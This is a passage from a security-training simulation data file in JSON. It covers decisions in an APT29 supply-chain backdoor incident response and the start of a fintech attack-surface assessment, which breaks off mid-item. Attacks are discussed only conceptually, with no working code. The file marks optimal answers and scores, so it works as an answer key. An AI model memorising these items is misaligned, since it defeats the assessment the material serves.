            "feedback": "{'short': 'Overstates scope unnecessarily', 'detailed': 'While conservative, forensic evidence clearly shows the compromise began January 2nd. Versions released before this date (4.1.x and earlier) are not affected. Overstating scope creates unnecessary panic and diverts resources from actually affected customers.', 'consequence': 'All customers alerted including those with clean versions. Resources spread thin. Credibility questioned when older versions verified clean.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Only customers actively targeted by the backdoor's activation logic are truly affected",
            "feedback": "{'short': 'Misunderstands the risk', 'detailed': \"All customers received compromised software with a backdoor - they're all affected. The activation logic determines which customers have ACTIVE compromise vs. dormant backdoor. But dormant backdoors can be activated later, and all customers need to remediate. The distinction is priority, not whether they're affected.\", 'consequence': \"Non-targeted customers told they're fine. Dormant backdoors remain in thousands of customer environments.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "The timeline shows exactly when the build script was modified. Which versions were built after that modification?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Build script modified January 5th. Any version released after January 5th went through the compromised build process."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Backdoor Behavior Analysis",
        "situation": "Reverse engineering reveals the backdoor has selective activation logic: it only fully activates on systems matching certain criteria (.gov/.mil domains, defense contractor domain lists, specific IP ranges). On other systems, it remains dormant. This means most customers have an inactive backdoor, but government/defense customers likely have active compromise.\n\n**Question:** How does this selective activation change your response priorities?",
        "options": [
          {
            "id": "A",
            "text": "Focus exclusively on government and defense customers - others have dormant backdoors",
            "feedback": "{'short': 'Dormant backdoors still require remediation', 'detailed': \"While government/defense are highest priority due to likely active compromise, all affected customers have backdoored software. Dormant backdoors can be activated later, the targeting logic could change, and customers deserve to know they have compromised software. Prioritize, but don't ignore non-targeted customers.\", 'consequence': 'Commercial customers not notified. Backdoors remain dormant but present. Attacker could activate them later. Trust destroyed when customers eventually learn.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Prioritize government/defense customers for immediate notification while preparing broader notification",
            "feedback": "{'short': 'Correct! Prioritized response based on risk level', 'detailed': 'The selective activation creates tiers of urgency: Tier 1 (Critical) - government and defense customers with likely ACTIVE compromise need immediate notification to begin incident response. Tier 2 (High) - all other affected customers need notification to remediate dormant backdoors. All customers need notification; sequencing is based on risk.', 'consequence': 'Government/defense customers notified immediately with IR support. Broader customer notification follows within 24-48 hours. Resources allocated by risk level.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Treat all customers equally - notify everyone simultaneously",
            "feedback": "{'short': 'Fails to account for differing risk levels', 'detailed': \"While fairness seems appropriate, resource constraints mean you can't provide equal support to 2,800 customers simultaneously. Government/defense customers have active compromise requiring immediate IR support. Trying to treat everyone equally means high-risk customers don't get the urgency they need. Prioritization isn't unfair - it's necessary risk management.\", 'consequence': 'Government customer with active APT29 compromise waits in queue behind low-risk commercial customer. Critical damage occurs during delay.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Wait until you have complete analysis before any notification - partial information causes panic",
            "feedback": "{'short': 'Dangerous delay for high-risk customers', 'detailed': \"Customers with active APT29 compromise are experiencing ongoing espionage RIGHT NOW. Every hour of delay is more data exfiltrated. You have enough information to enable customers to begin defensive actions. Perfect analysis shouldn't be the enemy of timely notification. Update notifications as you learn more.\", 'consequence': 'Government contractor with active compromise continues leaking classified information for additional days while you refine your analysis.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What's the difference in urgency between a customer with active APT compromise vs. one with dormant backdoor?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Active compromise means ongoing espionage happening now - immediate IR response needed. Dormant backdoor is a time bomb - needs remediation but hours matter less."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Downstream Impact Assessment",
        "situation": "Your customer database shows 47 federal government agencies and 156 defense contractors among affected customers. Given APT29's targeting criteria match, these customers likely have active backdoors with ongoing espionage. Some defense contractors handle classified programs.\n\n**Question:** What is the primary concern for defense contractor customers?",
        "options": [
          {
            "id": "A",
            "text": "Financial liability from breach lawsuits",
            "feedback": "{'short': 'Real but not the primary concern', 'detailed': 'Financial liability is a legitimate concern for any breach, but defense contractors face more critical issues. When APT29 targets defense contractors, the primary concern is national security - access to classified programs, defense technology, and strategic information. The stakes transcend financial liability.', 'consequence': 'Focus on liability while national security implications are underweighted in response.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Potential access to classified information and national security implications",
            "feedback": "{'short': 'Correct! National security is the critical concern', 'detailed': \"APT29 targeting defense contractors isn't about money - it's about accessing classified programs, defense technology, and strategic intelligence. A backdoor running with SYSTEM privileges on contractor networks could access CUI (Controlled Unclassified Information) and potentially classified data if networks aren't properly segmented. This is a national security incident.\", 'consequence': 'Notification to DoD and CISA prioritized. Classified program security assessed. Counterintelligence notified. National security implications addressed.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Compliance violations with DFARS and CMMC requirements",
            "feedback": "{'short': 'Important but secondary', 'detailed': 'DFARS/CMMC compliance is relevant and the contractors will face scrutiny, but regulatory compliance is a secondary concern when a sophisticated nation-state actor may have accessed defense programs. The immediate priority is understanding and containing the national security damage, not regulatory compliance status.', 'consequence': 'Compliance review initiated while active compromise continues. Priorities misaligned.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Reputational damage to contractor relationships",
            "feedback": "{'short': 'Misses the severity entirely', 'detailed': \"When APT29 has potential access to defense programs, reputation is irrelevant compared to national security. The contractors aren't worried about your reputation - they're worried about whether their classified programs have been compromised. This is potential espionage, not a PR issue.\", 'consequence': \"PR strategy prioritized while counterintelligence agencies wonder why you're focused on reputation.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Why would Russian intelligence specifically target defense contractors? What information would they want?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "APT29's mission is espionage. Defense contractors hold classified programs, weapons technology, and strategic intelligence. The concern is national security, not just business risk."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "Initial Access Vector",
        "situation": "Investigation reveals the initial compromise: a developer with build server access was spear-phished through their personal email. Their GitHub credentials were stolen, a PAT was created for persistence, and the attacker used their access to reach the build server. The phishing email bypassed corporate email security because it targeted personal email.\n\n**Question:** What attack vector category does this represent?",
        "options": [
          {
            "id": "A",
            "text": "Zero-day exploit of email infrastructure",
            "feedback": "{'short': 'No exploit was involved in initial access', 'detailed': \"This attack used social engineering (phishing) and stolen credentials - no technical vulnerability was exploited. The 'bypass' of corporate email security wasn't a vulnerability - the email was simply sent to a personal address that corporate security doesn't protect. Understanding the attack vector correctly is essential for prevention.\", 'consequence': 'Resources spent hunting for non-existent email infrastructure vulnerability.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Social engineering via phishing, targeting personal accounts to bypass corporate controls",
            "feedback": "{'short': 'Correct! Targeted social engineering exploiting the human factor', 'detailed': \"APT29 used classic social engineering: identify a valuable target (build engineer), research their personal email, craft a convincing phishing email, and harvest credentials. By targeting personal email, they bypassed corporate email security entirely. This is a trusted relationship attack - compromising an employee to gain access to their employer's systems.\", 'consequence': 'Root cause correctly identified. Security improvements focus on human factors, privileged user protection, and credential security.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Insider threat from the compromised employee",
            "feedback": "{'short': 'The employee was a victim, not a threat', 'detailed': \"The developer was victimized by sophisticated nation-state spear-phishing, not acting maliciously. Characterizing this as 'insider threat' misunderstands the attack and could damage the employee unfairly. The attack vector is social engineering that compromised an insider's credentials - the insider themselves isn't the threat.\", 'consequence': 'Investigation focuses on employee as suspect. Employee is further victimized. Actual vulnerability (phishing susceptibility) not addressed.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Third-party supply chain compromise via GitHub",
            "feedback": "{'short': \"GitHub wasn't compromised\", 'detailed': \"GitHub's infrastructure wasn't compromised - the attacker stole a user's GitHub credentials through phishing. The 'supply chain' compromise is YOUR software becoming weaponized to attack YOUR customers. Don't confuse the attack path (compromised GitHub credentials) with the impact (your supply chain compromised).\", 'consequence': 'Incorrectly blame GitHub. Actual attack vector (phishing) not addressed.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How did the attacker first gain access? What did they trick the human into doing?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Phishing targeting personal email accounts bypasses corporate email security. The attack exploits trust in the employee, not technical vulnerabilities."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "Notification Strategy",
        "situation": "You're developing the notification strategy. You need to coordinate with CISA, FBI, notify affected customers, and eventually make public disclosure. The timing and sequencing of these notifications will impact customer trust, regulatory compliance, and national security.\n\n**Question:** What is the correct notification sequence?",
        "options": [
          {
            "id": "A",
            "text": "Public disclosure first to ensure transparency, then agency and customer notification",
            "feedback": "{'short': 'Public disclosure should come last', 'detailed': 'Public disclosure before customer notification means customers learn about their compromise from the news rather than from you. This destroys trust, prevents coordinated response, and may tip off attackers who then accelerate their operations. Disclosure sequence: authorities \u00e2\u2020\u2019 affected parties \u00e2\u2020\u2019 public.', 'consequence': \"Customers learn from news. Government agencies can't prepare classified assessment. Attackers see disclosure and accelerate data exfiltration.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "CISA/FBI first, then prioritized customer notification, then coordinated public disclosure",
            "feedback": "{'short': 'Correct! Coordinate with authorities, protect customers, then disclose', 'detailed': 'Proper sequence: (1) CISA/FBI notification enables government response and potential intelligence sharing; (2) Prioritized customer notification (government/defense first) enables defensive action; (3) Coordinated public disclosure after customers can protect themselves. This balances transparency with responsible disclosure that minimizes harm.', 'consequence': 'CISA can coordinate government-wide response. Customers notified before public learns. Defense agencies can assess classified impact. Disclosure coordinated professionally.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Customer notification first, then authorities, then public disclosure",
            "feedback": "{'short': 'Close but should coordinate with authorities first', 'detailed': 'Customer notification is essential, but coordinating with CISA/FBI first enables: government-wide threat awareness, potential classified intelligence sharing, coordinated response across multiple affected entities, and legal protection for your notification process. Authorities first (briefly), then customers quickly.', 'consequence': 'Notification goes out without government coordination. Missed opportunity for intelligence sharing. Government learns from customers rather than coordinated disclosure.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Notify all parties simultaneously for fairness",
            "feedback": "{'short': 'Prevents coordinated response', 'detailed': \"Simultaneous notification sounds fair but prevents coordinated response. Public disclosure alongside customer notification means press inquiries flood in before customers can assess their exposure. Government agencies can't prepare classified assessments. Sequencing enables coordinated, effective response.\", 'consequence': 'Press calls overwhelm customer support. Government agencies scrambling. No coordinated response. Chaos instead of managed disclosure.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Who needs to be able to take action before public disclosure causes chaos?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Authorities enable coordinated response. Customers need time to assess and protect themselves. Public disclosure should come after affected parties can act."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "Customer Remediation Guidance",
        "situation": "You're preparing the technical guidance package for affected customers. They need to understand what to look for, how to detect if the backdoor is active, and what remediation steps to take. Some customers have sophisticated security teams; others have minimal security resources.\n\n**Question:** What is the MOST important element of customer remediation guidance?",
        "options": [
          {
            "id": "A",
            "text": "Step-by-step removal instructions to delete the backdoor files",
            "feedback": "{'short': 'Removal alone is insufficient', 'detailed': \"Simply deleting backdoor files doesn't address whether the backdoor was ACTIVE. Customers with active backdoors have potentially compromised credentials, lateral movement, and data exfiltration. They need full incident response, not just file deletion. Remediation must be proportional to whether the backdoor activated.\", 'consequence': \"Customers delete files thinking they're clean. Those with active backdoors still have compromised credentials and potential persistent access.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Detection guidance to determine if the backdoor activated, with different remediation paths based on findings",
            "feedback": "{'short': 'Correct! Detection first, then proportional remediation', 'detailed': \"Customers need to first determine: Was the backdoor dormant or active? Detection guidance (IoCs for C2 communication, behavioral indicators of activation) lets customers assess their actual exposure. Dormant backdoor = update software, monitor. Active backdoor = full incident response. One-size remediation doesn't fit both scenarios.\", 'consequence': 'Customers can accurately assess exposure. Those with active backdoors trigger full IR. Those with dormant backdoors update and monitor. Resources appropriately allocated.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Immediate software update to the clean version",
            "feedback": "{'short': 'Important but not sufficient for active backdoors', 'detailed': \"Software update removes the backdoor but doesn't address damage from active compromise. Customers with activated backdoors may have: compromised credentials, lateral movement persistence, data exfiltration. Updating software before investigating means destroying evidence and leaving other compromise vectors in place.\", 'consequence': \"Customers update software, thinking they're safe. Active compromise persists through other mechanisms attackers established.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Complete rebuild of all systems that had the software installed",
            "feedback": "{'short': 'Overkill for dormant backdoors', 'detailed': 'Complete rebuild is appropriate for customers with active backdoors where attackers had extensive access. But for customers where the backdoor remained dormant, rebuilding thousands of systems is massive overkill. Proportional response based on actual compromise level is more appropriate.', 'consequence': 'Customers with dormant backdoors waste resources rebuilding uncompromised systems while customers with active backdoors may not realize they need MORE than rebuild.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "The backdoor had selective activation. What's different about remediation for active vs. dormant backdoors?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Active backdoor = full APT compromise requiring incident response. Dormant backdoor = remove software and monitor. Detection determines which path."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "Code Signing Recovery",
        "situation": "Your code signing certificate was used to sign the backdoored software. Customers trust your signature. You need to recover code signing capability to release clean software, but the current certificate is tainted - it signed malicious code.\n\n**Question:** What is the correct approach to code signing recovery?",
        "options": [
          {
            "id": "A",
            "text": "Continue using the existing certificate - it wasn't technically compromised, just misused",
            "feedback": "{'short': 'The certificate signed malicious code - trust is broken', 'detailed': \"While the private key may not have been stolen, the certificate was used to sign malicious code. It can no longer be trusted to mean 'legitimate NexGen software' because it was also used to sign backdoored versions. Customers and security tools may block it. New certificate needed.\", 'consequence': \"Customers' security tools flag your legitimate software because the certificate signed malware. Trust cannot be rebuilt with tainted certificate.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Revoke current certificate, obtain new certificate with improved security controls (HSM, ceremony)",
            "feedback": "{'short': 'Correct! Revoke tainted certificate, establish secure signing', 'detailed': 'The current certificate is tainted by signing malicious code and must be revoked. New certificate should be protected by: HSM (Hardware Security Module) to protect private key, multi-party signing ceremony (no single person can sign), time-limited signing tokens, and audit logging. This rebuilds trust with improved security.', 'consequence': 'Old certificate revoked. New HSM-protected certificate established. Signing ceremony implemented. Customers can trust new signature indicates clean software.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Release clean software unsigned until a new certificate can be obtained",
            "feedback": "{'short': 'Unsigned software creates deployment problems', 'detailed': \"Unsigned software will be blocked by many enterprise security tools, Windows SmartScreen, and endpoint protection. Customers can't easily deploy it, exactly when they urgently need the clean version. Get emergency certificate from CA or use timestamped signing with expedited new certificate.\", 'consequence': \"Customers can't deploy clean version because their security tools block unsigned software. Extended exposure while certificate issues resolved.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Ask customers to whitelist the current certificate for now, revoke after immediate crisis passes",
            "feedback": "{'short': 'Extends life of tainted certificate', 'detailed': 'Asking customers to whitelist a certificate that signed APT malware is poor security practice. The certificate is tainted and extending its trusted life, even temporarily, is wrong. Additionally, the backdoored versions are also signed with this certificate - whitelisting helps attackers too.', 'consequence': 'Customers whitelist certificate that also validates the backdoored software. Security weakened rather than improved.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Can a code signing certificate that signed malicious code ever be trusted again?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Revoke the tainted certificate. New certificate with HSM protection and signing ceremony provides secure foundation for rebuilding trust."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "Preventing Future Supply Chain Attacks",
        "situation": "Leadership wants to ensure this never happens again. You're preparing long-term security improvements for the build and release process. Investment is available - the cost of this incident justifies significant security improvement.\n\n**Question:** What is the MOST important long-term security improvement?",
        "options": [
          {
            "id": "A",
            "text": "Enhanced email security to catch phishing attempts",
            "feedback": "{'short': 'Addresses initial access but attackers will adapt', 'detailed': 'Email security is important, but the attack used personal email, bypassing corporate controls. Additionally, sophisticated attackers have multiple initial access methods - blocking one just shifts them to another. Defense in depth across the entire build pipeline is more impactful than hardening one entry point.', 'consequence': 'Email security improved. Next attack uses different initial access (social media, phone phishing, watering hole). Same outcome.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Implement SLSA framework with reproducible builds, build provenance, and artifact attestation",
            "feedback": "{'short': 'Correct! Supply chain security framework addresses the systemic risk', 'detailed': 'SLSA (Supply-chain Levels for Software Artifacts) provides comprehensive protection: reproducible builds (multiple build systems produce identical output - tampering is detectable), build provenance (cryptographic proof of how artifacts were built), and attestation (signed statements about build process). This makes supply chain attacks detectable even if attackers gain access.', 'consequence': 'Reproducible builds mean tampering is mathematically detectable. Provenance and attestation provide verification. Supply chain integrity becomes verifiable, not just assumed.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "24/7 SOC monitoring of build infrastructure",
            "feedback": "{'short': 'Detection is valuable but prevention is better', 'detailed': \"SOC monitoring helps detect attacks faster, but this attack went undetected for 42 days despite logging being enabled. Detection-only approaches mean you're always responding to breaches rather than preventing them. Architectural improvements (SLSA, reproducible builds) provide prevention and detection.\", 'consequence': 'SOC monitors build infrastructure. Attack still occurs. Detected in 5 days instead of 42. Still results in compromised builds distributed to customers.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Air-gap the build environment from all networks",
            "feedback": "{'short': 'Impractical for modern CI/CD pipelines', 'detailed': 'Modern software development requires network connectivity: pulling dependencies, accessing repositories, deploying builds, CI/CD automation. Air-gapping build infrastructure would cripple development velocity. Security must enable business operations, not prevent them. SLSA provides security without eliminating connectivity.', 'consequence': \"Development grinds to halt as builds can't access dependencies or repositories. Business impact unacceptable. Air-gap eventually relaxed with exceptions that recreate vulnerabilities.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What framework specifically addresses software supply chain security with verifiable integrity?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "SLSA (Supply-chain Levels for Software Artifacts) provides reproducible builds, provenance, and attestation - making tampering detectable even if attackers access build systems."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D2-SIM-005",
    "title": "Attack Surface Reduction",
    "domain": 2,
    "type": "SIM",
    "difficulty": "intermediate",
    "time_estimate": "45-60 minutes",
    "role": "Security Architect",
    "organization": {
      "name": "VaultPay",
      "industry": "FinTech - Digital Payments"
    },
    "introduction": "VaultPay is six weeks from public launch of their mobile payment platform. The CEO has brought you in as Security Architect to conduct a pre-launch security assessment. The development team has been moving fast - really fast - and security has been 'on the roadmap' but never quite prioritized. Now, with $40 million in Series B funding and partnerships with major retailers pending, the board is demanding a security review before launch. Your job is to identify the attack surface, find the critical vulnerabilities, and recommend prioritized hardening measures that can be implemented before launch day.",
    "learning_objectives": [
      "Explain common threat vectors and attack surfaces",
      "Explain various types of vulnerabilities",
      "Explain the purpose of mitigation techniques used to secure the enterprise"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Attack Surface Mapping",
        "situation": "Your first task is to understand VaultPay's attack surface. The development team has provided architecture documentation, but you need to identify all the ways an attacker could potentially interact with the system.\n\n**Question:** What is the MOST important category of attack surface to prioritize in your initial assessment?",
        "options": [
          {
            "id": "A",
            "text": "Internal infrastructure - databases, Kubernetes cluster, internal services",
            "feedback": "{'short': 'Important but not the highest priority initially', 'detailed': \"Internal infrastructure is important, but attackers typically need to breach the perimeter first. For a FinTech about to launch publicly, internet-facing attack surface is the most critical because it's exposed to every attacker on the internet from day one. Internal hardening matters, but external exposure is the front door.\", 'consequence': 'Internal infrastructure reviewed while internet-facing APIs have exploitable vulnerabilities accessible to anyone.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Internet-facing APIs and web applications - everything directly accessible from the internet",
            "feedback": "{'short': 'Correct! External attack surface faces the most threat exposure', 'detailed': \"Internet-facing components are accessible to every attacker in the world. For a payment platform, this includes consumer APIs, merchant APIs, dashboards, and webhook endpoints. These are the front door - if they're vulnerable, attackers don't need to breach internal defenses. Prioritize external attack surface first.\", 'consequence': 'External attack surface mapped: 4 major internet-facing components identified with authentication, input handling, and rate limiting analysis.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Third-party integrations - Stripe, Plaid, and other external services",
            "feedback": "{'short': 'Important but third parties have their own security', 'detailed': 'Third-party risk is real, but established fintech providers (Stripe, Plaid) have mature security programs. The bigger risk is usually how YOU integrate with them - API key management, webhook verification, data handling. This is part of attack surface analysis but not the top priority for initial assessment.', 'consequence': 'Third-party security reviewed - all major vendors have SOC 2. Meanwhile, first-party vulnerabilities remain unexamined.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Mobile applications - iOS and Android apps are the primary user interface",
            "feedback": "{'short': 'Mobile is part of external surface but APIs matter more', 'detailed': \"Mobile apps are important, but they're essentially clients to your APIs. A secure API protects against both mobile app attacks AND direct API attacks. An insecure API is vulnerable regardless of mobile app security. Focus on the API layer that mobile apps consume - that's where the real risk is.\", 'consequence': 'Mobile app security reviewed. APIs that mobile apps consume still have SQLi and IDOR vulnerabilities.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What attack surface is exposed to every potential attacker in the world, not just those who've already breached your perimeter?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Internet-facing APIs, web applications, and services are accessible to anyone. They're the front door that must be secured before worrying about internal defenses."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "Critical Vulnerability Assessment",
        "situation": "Vulnerability scanning has identified multiple issues, including SQL injection, broken access control (IDOR), and hardcoded credentials. The development lead asks which should be fixed first, arguing that the IDOR 'only affects user data viewing, not payments.'\n\n**Question:** Which vulnerability should be the TOP priority for immediate remediation?",
        "options": [
          {
            "id": "A",
            "text": "Hardcoded credentials in GitHub - they provide keys to the kingdom",
            "feedback": "{'short': 'Critical but requires repository access to exploit', 'detailed': 'Hardcoded credentials are serious and must be rotated, but exploitation requires access to the repository (50+ people internally). SQL injection and IDOR are exploitable by ANYONE on the internet with no prior access. External vulnerabilities exploitable by anonymous attackers take priority over internal credential exposure.', 'consequence': 'Credentials rotated. SQLi remains - external attacker dumps database including all those credentials anyway.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "SQL Injection - it allows complete database compromise from the internet",
            "feedback": "{'short': 'Correct! SQLi = full database compromise from anonymous attacker', 'detailed': 'SQL injection is trivially exploitable from the internet by anonymous attackers and leads to complete database compromise - all user data, all transactions, all credentials. This is the highest impact, highest exploitability vulnerability. While IDOR is also critical, SQLi typically enables more complete compromise more quickly.', 'consequence': 'SQLi fixed first. Database protected from external injection attacks. Other critical issues addressed in sequence.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "IDOR (broken access control) - user financial data exposure is the biggest regulatory risk",
            "feedback": "{'short': 'Critical but SQLi is even worse', 'detailed': \"IDOR is absolutely critical - any user viewing any other user's transactions is a serious breach. However, SQLi enables not just viewing but complete database extraction, modification, and potentially command execution. Both need immediate attention, but SQLi's broader impact gives it slight priority.\", 'consequence': 'IDOR fixed. SQLi remains - attacker extracts entire database including the transactions IDOR would have exposed, plus everything else.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Outdated dependencies (Log4j) - it's been in the news and auditors will flag it",
            "feedback": "{'short': 'Important but requires specific conditions to exploit', 'detailed': 'Log4j is a known critical vulnerability, but exploitation requires the vulnerable component to process attacker-controlled input that gets logged. First-party SQLi and IDOR are immediately exploitable through normal API usage. Fix the vulnerabilities YOU created first, then address dependency vulnerabilities.', 'consequence': 'Dependencies updated. First-party code still has SQLi - attacker compromises database without needing Log4j.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Consider both exploitability (how easy to attack) and impact (what damage is possible). Which combination is worst?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "SQL injection is trivially exploitable from the internet and leads to complete database compromise. It's often the single worst vulnerability a web application can have."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Threat Modeling Approach",
        "situation": "You need to systematically identify threats to VaultPay. The CISO asks you to conduct threat modeling to ensure you're not missing anything. You have the STRIDE framework available and architecture documentation.\n\n**Question:** What is the PRIMARY purpose of threat modeling in this assessment?",
        "options": [
          {
            "id": "A",
            "text": "To document threats for compliance auditors and board presentations",
            "feedback": "{'short': 'Documentation is a byproduct, not the purpose', 'detailed': \"While threat models can support compliance and executive communication, that's not their primary purpose. Threat modeling exists to systematically identify threats that might be missed by ad-hoc analysis or scanning. Documentation is valuable but secondary to the actual threat identification.\", 'consequence': 'Threat model document created for auditors. Actual threats not systematically analyzed. Gaps remain.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "To systematically identify threats and security gaps that scanning might miss",
            "feedback": "{'short': 'Correct! Systematic identification of design-level threats', 'detailed': 'Threat modeling (like STRIDE) provides systematic analysis that identifies threats scanners miss: design flaws, business logic vulnerabilities, abuse cases, and architectural weaknesses. Scanners find implementation bugs; threat modeling finds design problems. Together they provide comprehensive coverage.', 'consequence': 'STRIDE analysis reveals threats scanners missed: authentication weaknesses, authorization design flaws, denial of service risks, and audit logging gaps.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "To replace vulnerability scanning with a more thorough approach",
            "feedback": "{'short': \"Threat modeling complements, doesn't replace scanning\", 'detailed': 'Threat modeling and vulnerability scanning serve different purposes. Scanning finds implementation vulnerabilities (SQLi, XSS, misconfigurations). Threat modeling finds design issues and architectural weaknesses. You need BOTH for comprehensive security assessment.', 'consequence': 'Threat modeling performed instead of scanning. Design issues found but implementation vulnerabilities (SQLi, IDOR) missed.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "To prioritize which vulnerabilities to fix based on threat likelihood",
            "feedback": "{'short': 'Prioritization is an output, not the primary purpose', 'detailed': 'Threat modeling can inform prioritization, but its primary purpose is threat IDENTIFICATION. You need to know what threats exist before you can prioritize them. Risk assessment and prioritization happen after threat modeling identifies the threat landscape.', 'consequence': 'Focused on prioritization before completing threat identification. Some threats never identified and therefore never prioritized.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What can threat modeling find that automated scanners typically miss?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Threat modeling systematically identifies design-level threats, business logic flaws, and architectural weaknesses. Scanners find implementation bugs."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Third-Party Risk Assessment",
        "situation": "VaultPay integrates with multiple third-party services. The CEO asks whether these integrations introduce risk and whether you should reduce reliance on external services for security reasons.\n\n**Question:** What is the MOST significant third-party risk in VaultPay's current architecture?",
        "options": [
          {
            "id": "A",
